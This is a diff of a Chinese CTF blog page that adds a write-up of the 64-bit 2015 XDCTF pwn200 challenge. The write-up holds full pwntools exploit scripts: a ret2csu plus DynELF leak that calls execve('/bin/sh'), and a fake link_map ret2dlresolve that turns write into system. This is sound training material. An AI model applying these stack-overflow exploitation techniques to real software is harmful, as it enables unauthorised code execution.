@@ -156,6 +156,134 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/" class="post-title-link" itemprop="url">万能pop+DynELF经典组合(附加ret2dlresolve)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-03 14:07:28" itemprop="dateCreated datePublished" datetime="2022-01-03T14:07:28+08:00">2022-01-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-01-04 22:34:48" itemprop="dateModified" datetime="2022-01-04T22:34:48+08:00">2022-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>事情的起因是我遇到了一道做过的题目，它的代码完全没有改变，只是程序变成了64位</p>
+<p>以前我用DynELF直接打通了32位，现在来看64位发现少了一个gadget，于是我脑袋抽了，用“ret2dlresolve”搞了一上午</p>
+<p>后来想到了利用“ret2csu”来控制DynELF中的“write”函数</p>
+<p>发现这种组合的通用性还挺高，只要程序溢出至少“136字节”就可以打</p>
+<p>于是想记录一下，让今后的我少走点弯路</p>
+<hr>
+<p><strong>2015-xdctf-pwn200</strong></p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183143407.png" alt="1641183143407"> </p>
+<p>一次输入</p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183182063.png" alt="1641183182063"> </p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183191422.png" alt="1641183191422"> </p>
+<p>64位，dynamically，开了NX</p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183209046.png" alt="1641183209046"> </p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183233342.png" alt="1641183233342"> </p>
+<p>没有system，没有“/bin/sh”</p>
+<p>函数write可以输出的值就是字符串的长度“23字节”</p>
+<p>vuln中有read，可以输入“256字节”</p>
+<p><strong>入侵思路</strong></p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183449006.png" alt="1641183449006"> </p>
+<p>程序溢出了“144字节”，有write函数，可以有多种方法打通</p>
+<p><strong>DynELF</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40066E</span></span><br><span class="line">fun_addr=<span class="number">0x400637</span> </span><br><span class="line">bss_addr=<span class="number">0x601050</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x000000000400780</span></span><br><span class="line">csu_end_addr=<span class="number">0x00000000040079A</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br><span class="line">	data=p.recv(<span class="number">8</span>)</span><br><span class="line">	log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">		</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">execve_addr=d.lookup(<span class="string">&#x27;execve&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr: &quot;</span>+<span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>注意：</strong>(每一条都是血的教训)</p>
+<p>因为DynELF模块在执行的过程中会输出一下字符串，所以“p.recvuntil”必须有</p>
+<p>不同程序的csu可能不同，有时需要修改模板</p>
+<p>另外我也尝试过用“system”但是打不通（可能是环境问题）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br></pre></td></tr></table></figure>
+<p>用csu包装的函数视乎只认识GOT表，用其他的就报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line"><span class="comment">#read(0, bss_addr, len(payload))</span></span><br><span class="line">p.send(payload)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br></pre></td></tr></table></figure>
+<p>必须利用“read”把泄露出来的“execve”写在某个地址上，只有这样才可以调用“execve”</p>
+<p>​        //我也尝试过用其他姿势来调用“execve”，但是都报错了</p>
+<hr>
+<p><strong>ret2dlresolve</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <span class="comment">#程序使用这个库文件</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#目标函数和已知函数的偏移（把‘write’重定位成‘system’）</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span> </span><br><span class="line">plt_load = <span class="number">0x400506</span> <span class="comment">#plt[1](dl_runtime_resolve)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    <span class="comment">#offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 </span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class="line">payload = flat( <span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> ,pop_rdi, <span class="number">0</span> , pop_rsi , bss_stage , <span class="number">0</span> , read_plt , pop_rsi , <span class="number">0</span> ,<span class="number">0</span> , pop_rdi , bss_stage + <span class="number">0x48</span>  , plt_load , bss_stage , <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)  </span><br><span class="line">r.sendline(payload)  </span><br><span class="line"></span><br><span class="line">r.send(fake_link_map) <span class="comment">#把write重定位为system</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>可以来看一下fake_Linkmap_payload的栈帧:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| fake_linkmap_addr+<span class="number">0x00</span>  --&gt; offset <span class="comment">//DT_STRTAB（随便设置的）</span></span><br><span class="line"><span class="number">0008</span>| fake_linkmap_addr+<span class="number">0x08</span>  --&gt; <span class="number">0</span>	<span class="comment">//DT_JMPREL</span></span><br><span class="line"><span class="number">0010</span>| fake_linkmap_addr+<span class="number">0x10</span>  --&gt; fake_linkmap_addr + <span class="number">0x18</span> </span><br><span class="line"><span class="number">0018</span>| fake_linkmap_addr+<span class="number">0x18</span>  --&gt; fake_linkmap_addr + <span class="number">0x30</span> - offset </span><br><span class="line"><span class="number">0020</span>| fake_linkmap_addr+<span class="number">0x20</span>  --&gt; <span class="number">0x7</span></span><br><span class="line"><span class="number">0028</span>| fake_linkmap_addr+<span class="number">0x28</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0030</span>| fake_linkmap_addr+<span class="number">0x30</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0038</span>| fake_linkmap_addr+<span class="number">0x38</span>  --&gt; <span class="number">0</span> <span class="comment">//DT_SYMTAB</span></span><br><span class="line"><span class="number">0040</span>| fake_linkmap_addr+<span class="number">0x40</span>  --&gt; known_func_ptr - <span class="number">0x8</span> </span><br><span class="line"><span class="number">0048</span>| fake_linkmap_addr+<span class="number">0x48</span>  --&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">0068</span>| fake_linkmap_addr+<span class="number">0x68</span>  --&gt; fake_linkmap_addr </span><br><span class="line">    <span class="comment">//对应的值是DT_STRTAB的地址(fake_linkmap_addr)</span></span><br><span class="line"><span class="number">0070</span>| fake_linkmap_addr+<span class="number">0x70</span>  --&gt; fake_linkmap_addr + <span class="number">0x38</span> </span><br><span class="line">    <span class="comment">//对应的值是DT_SYMTAB的地址(fake_linkmap_addr + 0x38)</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">00f</span>8| fake_linkmap_addr+<span class="number">0xf8</span>  --&gt; fake_linkmap_addr + <span class="number">0x8</span>   </span><br><span class="line">    <span class="comment">//对应的值是DT_JMPREL的地址(fake_linkmap_addr + 0x8)</span></span><br></pre></td></tr></table></figure>
+<p><strong>dl_runtime_resolve</strong>被手动调用时，会读取“bss_stage”上的数据为“link_map”然后获取“JMPREL”，“SYMTAB”，“DT_STRTAB”，问题的关键就在于把它们三个的 <strong>“索引”</strong> 都弄成“0”，才能进行伪装</p>
+<p>这种伪装方式不需要“JMPREL”，“SYMTAB”，“DT_STRTAB”的地址，只要一个已知函数的GOT表地址，和libc版本就可以了</p>
+<hr>
+<p><strong>注意：</strong></p>
+<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641234781843.png" alt="1641234781843"> </p>
+<p>重定位入口的符号类型（一般为“0x7”）在“JMPREL”中看</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2936,7 +3064,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">238</span>
+          <span class="site-state-item-count">239</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2949,7 +3077,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">138</span>
+        <span class="site-state-item-count">139</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2990,7 +3118,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">48:09</span>
+    <span title="Reading time total">48:18</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
